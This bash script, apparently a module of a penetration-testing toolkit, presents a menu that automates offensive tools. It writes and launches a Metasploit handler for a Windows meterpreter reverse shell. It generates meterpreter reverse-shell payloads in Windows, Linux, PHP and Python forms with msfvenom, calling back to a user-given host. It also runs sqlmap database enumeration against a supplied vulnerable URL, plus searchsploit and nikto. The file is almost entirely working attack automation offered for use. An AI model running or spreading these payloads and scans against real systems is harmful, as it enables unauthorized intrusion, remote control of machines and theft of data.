#!/bin/bash
# File: modules/exploit.sh
# Author: Neo-virex

# Colors
RED="\e[31m"
GREEN="\e[32m"
BLUE="\e[34m"
YELLOW="\e[33m"
RESET="\e[0m"

OUTDIR="/tmp/outputs/exploit"
mkdir -p "$OUTDIR"

echo -e "${BLUE}[*] Starting Automated Exploitation Module...${RESET}"

read -p "Enter target IP or domain: " target

echo -e "${YELLOW}Select the tool to use for exploitation:${RESET}"
echo "1) Metasploit Framework (msfconsole)"
echo "2) MSFVenom payload generator"
echo "3) SQLmap (SQL Injection Exploitation)"
echo "4) Exploit-db search (searchsploit)"
echo "5) Nikto (Web Server Vulnerability Scan)"
echo "6) Exit"

read -p "Enter choice [1-6]: " choice

case $choice in
    1)
        echo -e "${GREEN}Launching Metasploit console for target $target...${RESET}"
        echo "use exploit/multi/handler" > "$OUTDIR/msf.rc"
        echo "set RHOST $target" >> "$OUTDIR/msf.rc"
        echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> "$OUTDIR/msf.rc"
        echo "set LHOST 0.0.0.0" >> "$OUTDIR/msf.rc"
        echo "set LPORT 4444" >> "$OUTDIR/msf.rc"
        echo "exploit" >> "$OUTDIR/msf.rc"
        echo -e "${YELLOW}Starting msfconsole with resource script...${RESET}"
        msfconsole -r "$OUTDIR/msf.rc"
        ;;
    2)
        echo -e "${GREEN}MSFVenom Payload Generator${RESET}"
        echo "Select payload type:"
        echo "1) windows/meterpreter/reverse_tcp"
        echo "2) linux/x86/meterpreter/reverse_tcp"
        echo "3) php/meterpreter_reverse_tcp"
        echo "4) python/meterpreter_reverse_tcp"
        echo "5) Exit"

        read -p "Enter payload choice: " pay_choice

        case $pay_choice in
            1) payload="windows/meterpreter/reverse_tcp" ;;
            2) payload="linux/x86/meterpreter/reverse_tcp" ;;
            3) payload="php/meterpreter_reverse_tcp" ;;
            4) payload="python/meterpreter_reverse_tcp" ;;
            5) echo "Exiting..."; exit 0 ;;
            *) echo "Invalid choice"; exit 1 ;;
        esac

        read -p "Enter LHOST (your IP): " lhost
        read -p "Enter LPORT (listening port): " lport
        read -p "Enter output file name (e.g., shell.php, shell.exe): " outfile

        msfvenom -p $payload LHOST=$lhost LPORT=$lport -f raw -o "$OUTDIR/$outfile"
        echo -e "${GREEN}Payload created at $OUTDIR/$outfile${RESET}"
        ;;
    3)
        echo -e "${GREEN}Starting SQLmap for SQL Injection exploitation on $target...${RESET}"
        read -p "Enter URL with vulnerable parameter (e.g., http://site.com/page.php?id=1): " vuln_url
        sqlmap -u "$vuln_url" --batch --dbs
        ;;
    4)
        read -p "Enter search term for exploit-db: " exploit_term
        searchsploit "$exploit_term"
        ;;
    5)
        echo -e "${GREEN}Starting Nikto Web Server Vulnerability Scan on $target...${RESET}"
        nikto -host "$target"
        ;;
    6)
        echo "Exiting Exploitation module."
        exit 0
        ;;
    *)
        echo -e "${RED}Invalid choice.${RESET}"
        ;;
esac
